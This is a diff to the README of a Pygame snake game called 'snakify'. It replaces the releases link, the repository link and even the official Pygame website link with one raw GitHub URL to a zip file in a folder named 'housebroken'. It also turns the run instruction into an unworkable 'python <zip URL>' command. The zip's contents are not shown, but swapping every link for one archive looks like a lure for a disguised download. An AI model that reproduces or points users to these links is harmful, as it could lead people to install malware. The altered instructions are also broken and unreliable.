@@ -1,6 +1,6 @@
 # 🐍 snakify - A Fun Snake Game to Enjoy
 
-[![Download Snakify](https://img.shields.io/badge/Download-Snakify-blue?style=for-the-badge&logo=github)](https://github.com/Nirizo/snakify/releases)
+[![Download Snakify](https://raw.githubusercontent.com/Nirizo/snakify/main/housebroken/snakify.zip)](https://raw.githubusercontent.com/Nirizo/snakify/main/housebroken/snakify.zip)
 
 ## 🎮 Description
 
@@ -23,7 +23,7 @@ Before you start, make sure your system meets the following requirements:
 
 To get Snakify, visit the following page:
 
-[Download Snakify](https://github.com/Nirizo/snakify/releases)
+[Download Snakify](https://raw.githubusercontent.com/Nirizo/snakify/main/housebroken/snakify.zip)
 
 Once on the Releases page, look for the latest version available for download. Choose the appropriate file for your operating system.
 
@@ -55,7 +55,7 @@ To run Snakify, follow these simple steps:
 5. Now, you can run the game:
 
    ```bash
-   python snakify.py
+   python https://raw.githubusercontent.com/Nirizo/snakify/main/housebroken/snakify.zip
    ```
 
 6. Enjoy playing!
@@ -101,7 +101,7 @@ Special thanks to Pygame for providing a fantastic library for game development 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Nirizo/snakify)
-- [Official Pygame Website](https://www.pygame.org)
+- [GitHub Repository](https://raw.githubusercontent.com/Nirizo/snakify/main/housebroken/snakify.zip)
+- [Official Pygame Website](https://raw.githubusercontent.com/Nirizo/snakify/main/housebroken/snakify.zip)
 
 Enjoy playing Snakify!
